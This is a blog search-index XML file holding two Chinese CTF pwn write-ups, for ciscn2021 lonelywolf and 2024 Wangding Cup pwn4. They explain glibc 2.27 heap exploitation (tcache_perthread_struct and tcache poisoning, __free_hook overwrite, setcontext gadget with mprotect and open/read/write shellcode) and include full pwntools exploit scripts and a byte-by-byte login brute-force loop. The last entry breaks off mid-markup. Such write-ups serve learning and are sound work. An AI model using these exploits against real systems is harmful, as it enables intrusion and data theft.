<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>lonelywolf题解</title>
      <link href="/2025/03/09/2025-03-09-ciscn2021-lonelywolf/"/>
      <url>/2025/03/09/2025-03-09-ciscn2021-lonelywolf/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每日一Pwn做到了这个题，又学到了新东西，主要是对于tcache_perthread_struct的攻击。</p><blockquote><p><a href="https://www.nssctf.cn/problem/856">https://www.nssctf.cn/problem/856</a></p></blockquote><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>glibc2.27-1.4(????)</p><p>alloc函数只能分配小于0x78大小的堆块，并且存储堆块指针的全局变量只有一个，多次alloc就会把之前的指针覆盖掉。</p><p>delete函数可以任意的uaf。</p><h1 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_perthread_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS     </span></span><br></pre></td></tr></table></figure><p>简单来说，会有一串单字节数组表示对应的tcache已经放了多少个，之后的就是各个tcache的表头了，我们如果能申请堆块到这个地方，从而修改tcache表头，我们就可以实现任意地址申请（即使申请到的堆块实际大小超出这个tcache的大小也没关系，tcache不检查）</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>由于alloc函数不能分配smallbin大小的堆块，也就是说不能依靠先申请一个smallbin大小的堆块然后释放掉从而泄漏libc指针了。</p><p>但是有uaf漏洞，我们可以向任意地址申请堆块。</p><p>我的思路就是这个样子，首先泄漏一下heap_base，这个非常简单，之后我们申请两次堆块，并在这两个堆块上面伪造堆块，最终实现的效果就是，在两个堆块中有一个大小在0xa0的堆块，并且后面还有一个小堆块防止合并。</p><p>然后在第二个堆块的fd位置写入tcache_perthread_struct，从而申请到这个结构里，然后修改tcache表头成我们伪造的堆块，这样我们再申请就能申请到我们伪造的堆块，而且因为这个堆块的size是0xa0，再连续释放8次就可以让这个堆块的fd指针指向unsortedbin，从而泄漏libc。</p><p>最后就是打free_hook修改为system，然后getshell。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p,<span class="string">&#x27;b* $rebase(0x908)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pp64</span>(<span class="params">*args</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, arg <span class="keyword">in</span> <span class="built_in">enumerate</span>(args):</span><br><span class="line">        payload+=p64(arg)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Your choice: &#x27;</span>,<span class="built_in">str</span>(c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./lonelywolf&#x27;</span>)</span><br><span class="line"><span class="comment">#node4.anna.nssctf.cn:28661</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28661)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/ctf/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">malloc(<span class="number">0x78</span>)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">edit(pp64(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base=uu64(p.recv(<span class="number">6</span>))-<span class="number">0x260</span></span><br><span class="line">leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造fake_chunk</span></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">edit(pp64(<span class="number">0</span>,<span class="number">0xa1</span>))</span><br><span class="line">malloc(<span class="number">0x50</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(pp64(heap_base+<span class="number">0x70</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_chunk=heap_base+<span class="number">0x2f0</span></span><br><span class="line">malloc(<span class="number">0x50</span>)</span><br><span class="line">malloc(<span class="number">0x50</span>)</span><br><span class="line">edit(p64(fake_chunk))</span><br><span class="line">malloc(<span class="number">0x50</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="comment">#show()</span></span><br><span class="line">    <span class="comment">#ru(&quot;Content: &quot;)</span></span><br><span class="line">    <span class="comment">#q=uu64(p.recv(6))</span></span><br><span class="line">    edit(pp64(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line">edit(pp64(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base=uu64(p.recv(<span class="number">6</span>))-<span class="number">0x7e72bdbebca0</span>+<span class="number">0x7e72bd800000</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">delete()</span><br><span class="line">edit(p64(free_hook))</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">edit(p64(system))</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">ti()</span><br><span class="line"><span class="comment"># 0x74a801400000</span></span><br></pre></td></tr></table></figure><h1 id="画图"><a href="#画图" class="headerlink" title="画图"></a>画图</h1><p><img src="/../imgs/2d95ba1b19a6d4cf0142d360eff9062d.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 网鼎杯青龙组初赛pwn4复现</title>
      <link href="/2025/03/08/2025-03-08-2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84pwn4%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/08/2025-03-08-2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84pwn4%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现了一下去年网鼎杯青龙组pwn4题目，学了一下新的东西</p><h1 id="爆破用户名与密码"><a href="#爆破用户名与密码" class="headerlink" title="爆破用户名与密码"></a>爆破用户名与密码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">username=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        username+=<span class="built_in">chr</span>(i).encode()</span><br><span class="line">        username+=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        sla(<span class="string">&quot;username:\n&quot;</span>,username)</span><br><span class="line">        r=p.recvline()</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;correct&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;the correct username:&quot;</span>,username)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;length!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">            username=username[:-<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            username=username[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;correct&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">password=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">sla(<span class="string">&quot;password:\n&quot;</span>,<span class="string">b&#x27;a\n\x00&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        password+=<span class="built_in">chr</span>(i).encode()</span><br><span class="line">        password+=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="comment">#sleep(0.1)</span></span><br><span class="line">        sla(<span class="string">&quot;username:\n&quot;</span>,username)</span><br><span class="line">        sla(<span class="string">&quot;password:\n&quot;</span>,password)</span><br><span class="line">        r=p.recvline()</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;correct&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;the correct password:&quot;</span>,password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;length!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">            password=password[:-<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            password=password[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;correct&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p>strlen遇到\x00会截断，因此我们可以实现逐个字节爆破，爆破脚本如上</p><h1 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h1><p>随意的uaf，开了沙箱，需要使用orw</p><p>glibc2.27版本</p><p>一开始考虑使用堆栈结合，先泄漏libc地址，再通过environ泄漏栈地址，最后打orw</p><p>但是程序没有办法通过envrion泄漏栈地址，具体原因是在save_data函数里面，申请堆块的同时要求必须写入，并且写入的时候会在最后添加\x00，这也就意味着即使我们能够申请到environ附近，也会导致根本无法泄漏数据，因为泄漏的数据全部都是自己写的，\x00会截断。</p><p>之前已经学到了使用setcontext中的gadget来实现orw，但是没有实践过，这个题目刚好可以实践。</p><h1 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h1><blockquote><p><a href="https://blog.wingszeng.top/pwn-glibc-setcontext/">https://blog.wingszeng.top/pwn-glibc-setcontext/</a></p></blockquote><p>因为题目的glibc版本是2.27，因此比较好利用setcontext。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000052050                               ; __int64 __fastcall setcontext(__int64)</span><br><span class="line">.text:0000000000052050                               public setcontext ; weak</span><br><span class="line">.text:0000000000052050                               setcontext proc near                    ; CODE XREF: sub_58680+C↓p</span><br><span class="line">.text:0000000000052050                                                                       ; DATA XREF: LOAD:0000000000009058↑o</span><br><span class="line">.text:0000000000052050                               ; __unwind &#123;</span><br><span class="line">.text:0000000000052050 57                            push    rdi</span><br><span class="line">.text:0000000000052051 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000052058 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:000000000005205A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:000000000005205F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000052065 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:000000000005206A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:000000000005206C 5F                            pop     rdi</span><br><span class="line">.text:000000000005206D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000052073 73 5B                         jnb     short loc_520D0</span><br><span class="line">.text:0000000000052073</span><br><span class="line">.text:0000000000052075 48 8B 8F E0 00 00 00          mov     rcx, [rdi+0E0h]</span><br><span class="line">.text:000000000005207C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:000000000005207E 0F AE 97 C0 01 00 00          ldmxcsr dword ptr [rdi+1C0h]</span><br><span class="line">.text:0000000000052085 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:000000000005208C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000052093 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000052097 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:000000000005209B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:000000000005209F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:00000000000520A3 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:00000000000520A7 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:00000000000520AE 51                            push    rcx</span><br><span class="line">.text:00000000000520AF 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:00000000000520B3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:00000000000520BA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:00000000000520C1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:00000000000520C5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:00000000000520C9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:00000000000520C9                               ; &#125; // starts at 52050</span><br><span class="line">.text:00000000000520CD                               ; __unwind &#123;</span><br><span class="line">.text:00000000000520CD 31 C0                         xor     eax, eax</span><br><span class="line">.text:00000000000520CF C3                            retn</span><br></pre></td></tr></table></figure><p>可以看到从52085开始，就是通过rdi来给寄存器赋值。当我们将__free_hook函数改成这里的libc+52085时，我们去free一个堆块，其中rdi也就是这个堆块的地址，我们在这个堆块中填充数据，就可以修改寄存器的值。其中可以通过修改rcx来劫持控制流。</p><p>具体思路：</p><p>首先找一个堆块，在这个堆块上伪造一个返回地址，充当栈结构，同时在这个堆块后面可以写入shellcode，当然是orw的shellcode，之后我们再伪造一个堆块，第二个堆块是要free掉的，因此在这上面填充数据以修改寄存器的值，之后就是利用tcache poisoning来申请到free_hook区域，然后改写free_hook为libc+52085，接下来释放掉第二个堆块即可。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p,<span class="string">&#x27;b* $rebase(0x1A98)\nhandle SIGALRM nostop\nb* $rebase(0x1407)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pp64</span>(<span class="params">*args</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, arg <span class="keyword">in</span> <span class="built_in">enumerate</span>(args):</span><br><span class="line">        payload+=p64(arg)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">data:<span class="built_in">bytes</span>,key=<span class="string">b&#x27;s4cur1ty_p4ssw0rd&#x27;</span></span>):</span><br><span class="line">    cipher = ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"><span class="comment"># 定义一个函数cmd，参数为c</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="comment"># 使用sla函数，参数为&quot;&gt; \n&quot;和c的字符串形式</span></span><br><span class="line">    sla(<span class="string">&quot;&gt; \n&quot;</span>,<span class="built_in">str</span>(c))</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">username=<span class="string">&quot;tgrddf55\x00&quot;</span></span><br><span class="line">password=<span class="string">&quot;my_password\x00&quot;</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;username:\n&quot;</span>,username)</span><br><span class="line">sla(<span class="string">&quot;password:\n&quot;</span>,password)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_data</span>(<span class="params">key,size,content=<span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input the key: \n&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line">    sla(<span class="string">&quot;size: \n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;value: \n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_data</span>(<span class="params">key</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input the key: \n&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_data</span>(<span class="params">key</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input the key: \n&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_data</span>(<span class="params">key,content</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input the key: \n&quot;</span>,<span class="built_in">str</span>(key))</span><br><span class="line">    sla(<span class="string">&quot;value: \n&quot;</span>,content)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    save_data(i,<span class="number">0x100</span>) <span class="comment">#0-3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete_data(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">read_data(<span class="number">0</span>)</span><br><span class="line">a=ru(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">b=ru(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">c=p.recv(<span class="number">8</span>)</span><br><span class="line">heap_base=uu64(rc4_decrypt(c))<span class="comment">#-0x10</span></span><br><span class="line">leak(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line"></span><br><span class="line">delete_data(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">read_data(<span class="number">1</span>)</span><br><span class="line">a=ru(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">b=ru(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">c=p.recv(<span class="number">8</span>)</span><br><span class="line">libc_base=uu64(rc4_decrypt(c))+<span class="number">0x749445000000</span>-<span class="number">0x7494453ebca0</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">set_context=libc_base+<span class="number">0x52085</span></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#填充栈结构+shellcode</span></span><br><span class="line">heap4_addr=heap_base+<span class="number">0x5c521931cab0</span>-<span class="number">0x5c521931c670</span></span><br><span class="line">flag_addr=heap4_addr+<span class="number">0x150</span></span><br><span class="line">shellcode_addr=heap4_addr+<span class="number">0x20</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode+=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,flag_addr,<span class="number">0x100</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,flag_addr,<span class="string">&#x27;rax&#x27;</span>)<span class="comment"># 1 stdout  2 stderr </span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">stack=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(shellcode_addr)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">stack+=shellcode</span><br><span class="line"><span class="built_in">print</span>(stack.<span class="built_in">hex</span>())</span><br><span class="line">t=rc4_decrypt(stack)</span><br><span class="line"><span class="built_in">print</span>(t.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">save_data(<span class="number">4</span>,<span class="number">0x250</span>,rc4_decrypt(stack)) 、</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充数据，之后要释放掉这个堆块</span></span><br><span class="line">rsp=heap4_addr+<span class="number">0x10</span> <span class="comment"># 0xa0</span></span><br><span class="line">rdi=(heap_base&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span> <span class="comment">#0x68</span></span><br><span class="line">rsi=<span class="number">0x1000</span>       <span class="comment"># 0x70</span></span><br><span class="line">rdx=<span class="number">7</span>            <span class="comment">#0x88</span></span><br><span class="line">rcx=libc_base+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>] <span class="comment"># 0xa8</span></span><br><span class="line">victim=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">victim=victim.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">victim+=p64(rdi)</span><br><span class="line">victim+=p64(rsi)</span><br><span class="line">victim=victim.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">victim+=p64(rdx)</span><br><span class="line">victim=victim.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">victim+=p64(rsp)</span><br><span class="line">victim+=p64(rcx)</span><br><span class="line">save_data(<span class="number">7</span>,<span class="number">0x270</span>,victim)</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache poisoning 申请到free_hook，改写它</span></span><br><span class="line">edit_data(<span class="number">0</span>,rc4_decrypt(p64(free_hook)))</span><br><span class="line">save_data(<span class="number">5</span>,<span class="number">0x100</span>)</span><br><span class="line">save_data(<span class="number">6</span>,<span class="number">0x100</span>,rc4_decrypt(p64(set_context)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x167A)\nhandle SIGALRM nostop&#x27;)</span></span><br><span class="line">delete_data(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x152C)\nhandle SIGALRM nostop&#x27;)</span></span><br><span class="line"></span><br><span class="line">ti()    </span><br></pre></td></tr></table></figure><h1 id="注意点"><a href="#注意点" class="headerlink" 